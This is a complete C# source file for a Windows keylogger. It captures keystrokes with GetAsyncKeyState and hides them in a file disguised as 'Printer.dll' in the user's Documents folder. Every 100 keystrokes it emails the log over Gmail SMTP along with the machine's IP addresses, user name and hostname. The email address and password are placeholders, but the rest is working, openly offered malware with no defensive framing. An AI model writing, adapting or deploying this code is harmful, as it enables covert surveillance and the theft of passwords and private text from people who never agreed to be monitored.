using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            //String to hold all KeyStroke
            long numberOfKeyStroke = 0;

            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            string path = (filePath + @"\Printer.dll");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            //Capture Keystroke and display in console.
            while (true)
            {
                //Pause and let other programs get a chance to run.
                Thread.Sleep(5);
                //Check all keys and state.
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        //Print to the console.
                        Console.Write((char)i + ", ");

                        //Store the stroke in text file.
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }

                        //send every 100 char to mail.
                        numberOfKeyStroke++;
                        if (numberOfKeyStroke % 100 == 0)
                        {
                            //Mail the file
                            SendMessage();
                        }
                    }

                }
            }


        }
        static void SendMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\Printer.dll";
            string emailBody = "";

            String logContents = File.ReadAllText(filePath);

            DateTime now = DateTime.Now;

            string subject = "Mail from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }
            emailBody += "\n User: " + Environment.UserDomainName + " \\" + Environment.UserName;
            emailBody += "\n Host: " + host;
            emailBody += "\n Time: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("FromMail");
            mailMessage.To.Add("ToMail");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("FromMail", "Password");
            mailMessage.Body = emailBody;
            client.Send(mailMessage);
        }
    }
}
